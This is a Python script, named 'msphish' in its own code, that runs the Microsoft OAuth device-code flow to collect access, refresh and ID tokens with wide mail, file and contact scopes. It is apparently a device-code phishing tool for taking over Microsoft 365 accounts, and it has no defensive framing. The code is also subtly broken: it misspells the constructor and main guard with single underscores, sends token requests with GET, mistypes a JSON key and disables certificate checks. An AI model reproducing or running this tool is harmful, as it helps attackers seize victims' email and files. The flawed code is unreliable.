import argparse
import sys 
import requests
import time
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

class Client(object):

    def _init_(self) -> None:
        self.ms_base_url = 'https://login.microsoftonline.com'
        self.graph_api_base_url = 'https://graph.microsoft.com/v1.0'
        self.base_headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0', 
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    def get_device_code(self, client_id: str) -> str:
        scope = ('Contacts.Read Files.ReadWrite Mail.Read Notes.Read Mail.ReadWrite '
            'openid profile User.Read email offline_access')
        r = requests.get(url = self.ms_base_url + '/organizations/oauth2/v2.0/devicecode',
            headers=self.base_headers,
            data={"client_id": client_id, "scope": scope},
            verify=False)
        if r.status_code != 200:
            raise Exception('[error] => (Could not get device id.)')
        json_ = r.json()
        return json_['device_code']

    def get_access_token(self, client_id:str, device_code:str) -> tuple:
        grant = "urn:ietf:params:oauth:grant-type:device_code"
        r = requests.get(url = self.ms_base_url + '/organizations/oauth2/v2.0/token',
            headers=self.base_headers,
            data={"grant_type": grant, "client_id": client_id, "code": device_code},
            verify=False)
        if "authorization_pending" in r.text:
            return None, 'authorization_pending'
        elif 'expired_token' in r.text:
            raise Exception('[error] => (Device code expired.)')
        elif r.status_code == 200:
            json_ = r.json()
            return {
                'access_token': json_['access_token'],
                'refresh_token': json_['referesh_token'],
                'id_token': json_['id_token']
            }, None
        else:
            try: raise Exception(f'[error] => {r.json()}')
            except: raise Exception(f'[error] => {r.text}')

def get_tokens(client_id:str, output_path:str = None) -> None:
    client = Client()
    device_code = client.get_device_code(client_id)
    print(f'[info] device_code: {device_code}')
    while True:
        tokens, err_msg = client.get_access_token(client_id, device_code)
        if err_msg:
            print(f'[info] {err_msg}')
            time.sleep(3)
            continue
        break
    if not output_path:
        print(json.dumps(tokens, indent=4, ensure_ascii=False))
        return
    with open(output_path, 'w') as file:
        json.dump(tokens, file, indent=4, ensure_ascii=False)
    
class Cli(object):
 
    def _init_(self, name: str) -> None:
        self.name = name
        self.root_parser = argparse.ArgumentParser(prog=name)

    def dispatch(self, argv: list) -> None:
        self.root_parser.add_argument('command',
            choices=['tokens',],
            help='the root action to be executed.')
        self.root_parser.add_argument('args', 
            help = argparse.SUPPRESS, nargs = argparse.REMAINDER)
        args = self.root_parser.parse_args(argv)
        getattr(self, args.command)(args.args)

    def tokens(self, args: list) -> None:
        parser = argparse.ArgumentParser(prog=f'{self.name} tokens',
            description='acquires the oauth2 access token.')
        parser.add_argument('client_id',
            help='the id of the client.',
            type=str)
        parser.add_argument('-f', '--file',
            help=('The name of the file to which the tokens will be dumped, '
            'output to console otherwise.'),
            type=str,
            dest='output_path'
        )
        parsed_args = parser.parse_args(args)
        get_tokens(**vars(parsed_args))

def main(argv: list) -> None:
    cli = Cli(name = 'msphish')
    cli.dispatch(argv)

if _name_ == "_main_":
    sys.exit(main(sys.argv[1:]))